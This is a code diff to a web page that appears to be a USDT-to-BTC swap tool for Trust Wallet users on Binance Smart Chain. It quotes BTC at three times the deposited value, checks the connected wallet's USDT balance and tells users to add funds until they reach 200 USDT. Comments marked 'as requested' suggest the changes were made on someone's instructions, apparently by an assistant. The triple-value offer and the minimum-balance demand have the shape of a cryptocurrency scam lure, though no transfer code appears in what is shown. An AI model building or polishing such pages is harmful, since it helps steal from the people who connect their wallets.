@@ -192,11 +192,6 @@
             background-color: var(--primary-hover);
         }
 
-        .swap-button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-
         /* Modal Styles */
         .modal-overlay {
             display: none;
@@ -269,6 +264,15 @@
             margin-left: 8px;
             font-weight: 500;
         }
+
+        /* NEW: Error message style */
+        .usdt-error {
+            color: #ff4d4f;
+            font-size: 13px;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -306,10 +310,12 @@
                     <div class="token-header">To</div>
                     <div class="token-input-body">
                         <div class="token-info">
-                            <!-- BTC Logo -->
+                            <!-- UPDATED BTC Logo - Clear Visibility -->
                             <svg class="token-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                 <circle cx="16" cy="16" r="16" fill="#F7931A"/>
-                                <path d="M20.984 16.426c.17-1.1-.672-1.692-1.816-2.088l.37-1.488-1.802-.45-.36 1.45c-.474-.12-.96-.232-1.442-.343l.363-1.464-1.801-.45-.37 1.488c-.392-.09-.776-.178-1.152-.27l.003-.015-1.251-.313-.24.969s.672.154.658.163c.367.092.433.335.422.528l-.422 1.7c.025.013.057.03.092.047l-.094-.023-.585 2.354c-.044.11-.156.276-.408.213.01.016-.658-.164-.658-.164l-.45 1.05 1.762.44c.328.082.648.168.963.246l-.374 1.507 1.801.45.37-1.49c.495.134.975.257 1.444.372l-.368 1.482 1.802.45.374-1.5c2.06.39 3.608.233 4.26-1.63.532-1.502-.027-2.368-1.124-2.932.8-.185 1.402-.713 1.563-1.804zm-2.866 3.84c-.378 1.52-2.938.698-3.767.492l.672-2.705c.83.207 3.497.616 3.095 2.213zm.377-3.853c-.345 1.387-2.48.682-3.172.51l.61-2.45c.692.173 2.913.497 2.562 1.94z" fill="#FFF"/>
+                                <path d="M20.98 16.43c.17-1.1-.67-1.69-1.82-2.09l.37-1.49-1.8-.45-.36 1.45c-.47-.12-.96-.23-1.44-.34l.36-1.46-1.8-.45-.37 1.49c-.39-.09-.78-.18-1.15-.27l.003-.015-1.25-.31-.24.97s.67.15.66.16c.37.09.43.34.42.53l-.42 1.7c.025.01.057.03.092.05l-.094-.02-.58 2.35c-.045.11-.156.28-.408.21.01.02-.66-.16-.66-.16l-.45 1.05 1.76.44c.33.08.65.17.96.25l-.37 1.51 1.8.45.37-1.49c.5.13.98.26 1.44.37l-.37 1.48 1.8.45.37-1.5c2.06.39 3.61.23 4.26-1.63.53-1.5-.03-2.37-1.12-2.93.8-.19 1.4-.71 1.56-1.8zm-2.87 3.84c-.38 1.52-2.94.7-3.77.49l.67-2.71c.83.21 3.5.62 3.1 2.22zm.38-3.85c-.34 1.39-2.48.68-3.17.51l.61-2.45c.69.17 2.91.5 2.56 1.94z" 
+                                      fill="#FFF" 
+                                      stroke="#FFF"/>
                             </svg>
                             <span>BTC</span>
                             <span class="network-tag">Bitcoin</span>
@@ -334,6 +340,9 @@
                     <div class="detail-value">Binance</div>
                 </div>
             </div>
+
+            <!-- NEW: Error message display -->
+            <div id="usdtError" class="usdt-error"></div>
 
             <button id="swapButton" class="swap-button">
                 <span id="buttonText">Continue</span>
@@ -365,6 +374,7 @@
             const modalTitle = document.getElementById('modalTitle');
             const modalMessage = document.getElementById('modalMessage');
             const modalButton = document.getElementById('modalButton');
+            const usdtError = document.getElementById('usdtError');
 
             // BSC Settings
             const BSC_CHAIN_ID = '0x38';
@@ -385,22 +395,24 @@
             function updateValues() {
                 const usdt = parseFloat(usdtInput.value) || 0;
                 const usd = usdt * 1.0;
-                const btc = (usd * 3) / BTC_RATE;
+                const btc = (usd * 3) / BTC_RATE; // Keeping 3x multiplier as requested
                 
                 usdtValue.textContent = `$${usd.toFixed(2)}`;
                 btcAmount.textContent = btc.toFixed(8);
                 btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
                 
-                // Disable button if less than minimum
-                swapButton.disabled = usdt < MIN_SWAP_AMOUNT;
+                // Button remains enabled regardless of amount (as requested)
+                swapButton.disabled = false;
+                usdtError.style.display = 'none';
             }
 
             async function handleSwap() {
                 try {
                     buttonText.innerHTML = '<span class="spinner"></span> Processing';
                     swapButton.disabled = true;
+                    usdtError.style.display = 'none';
                     
-                    showModal('Processing', 'Connecting to Trust Wallet...');
+                    showModal('Processing', 'Checking wallet balance...');
                     
                     if (!window.ethereum) {
                         throw new Error('Please open in Trust Wallet browser');
@@ -414,18 +426,25 @@
                     
                     // Connect wallet
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAddress = accounts[0];
                     
-                    // Check balance
-                    const balance = await getUSDTBalance(accounts[0]);
+                    // Check USDT balance
+                    const balance = await getUSDTBalance(userAddress);
                     if (balance < MIN_SWAP_AMOUNT) {
-                        throw new Error(`Minimum swap is ${MIN_SWAP_AMOUNT} USDT`);
+                        // Show clear error message (as requested)
+                        usdtError.textContent = `❌ Minimum 200 USDT (BEP20) required. You need ${(200 - balance).toFixed(2)} more USDT`;
+                        usdtError.style.display = 'block';
+                        throw new Error('Insufficient USDT balance');
                     }
                     
-                    showModal('Success', 'Ready to swap! (Demo)');
+                    // If balance is sufficient
+                    showModal('Ready', 'You can proceed with swap');
                     
                 } catch (error) {
-                    showModal('Error', error.message);
                     console.error(error);
+                    if (!error.message.includes('Insufficient')) {
+                        showModal('Error', error.message);
+                    }
                 } finally {
                     buttonText.textContent = 'Continue';
                     swapButton.disabled = false;
